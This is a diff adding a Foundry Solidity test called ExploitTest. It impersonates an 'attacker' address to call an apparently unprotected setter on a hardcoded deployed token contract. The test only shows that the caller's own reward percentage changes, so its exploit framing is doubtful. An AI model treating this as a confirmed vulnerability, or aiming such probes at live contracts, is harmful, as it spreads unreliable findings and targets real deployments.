@@ -1,0 +1,48 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface ILLG {
+    function setClaimRewardAsTokensPercentage(uint256 percentage) external;
+    function claimRewardAsTokensPercentage(address ofAddress) external view returns (uint256);
+    function owner() external view returns (address);
+    function transferOwnership(address newOwner) external;
+}
+
+contract ExploitTest is Test {
+    ILLG constant llg = ILLG(0xE4C293Eadbb9d72d68a680F1A66979726992c396);
+
+    function testUnprotectedSetClaimRewardAsTokensPercentage() public {
+        // Label for debug
+        vm.label(address(llg), "LLG");
+
+        // Determine the current owner (should be some deployer)
+        address owner = llg.owner();
+        console.log("Owner:", owner);
+
+        // Use a random attacker address
+        address attacker = address(0xBEEF);
+        vm.label(attacker, "Attacker");
+
+        // Attacker is not the owner
+        assertFalse(attacker == owner, "Attacker should not be owner");
+
+        // Attacker calls the unprotected function
+        vm.prank(attacker);
+        llg.setClaimRewardAsTokensPercentage(50);
+
+        // Verify the setting is recorded for the attacker
+        uint256 stored = llg.claimRewardAsTokensPercentage(attacker);
+        console.log("Attacker's stored percentage:", stored);
+        assertEq(stored, 50, "Attacker's percentage should be 50");
+
+        // Verify that the owner's own percentage remains default (0)
+        uint256 ownerPercentage = llg.claimRewardAsTokensPercentage(owner);
+        console.log("Owner's stored percentage:", ownerPercentage);
+        // Default is 0
+        assertEq(ownerPercentage, 0, "Owner's percentage should be 0 (unchanged)");
+    }
+}
+```
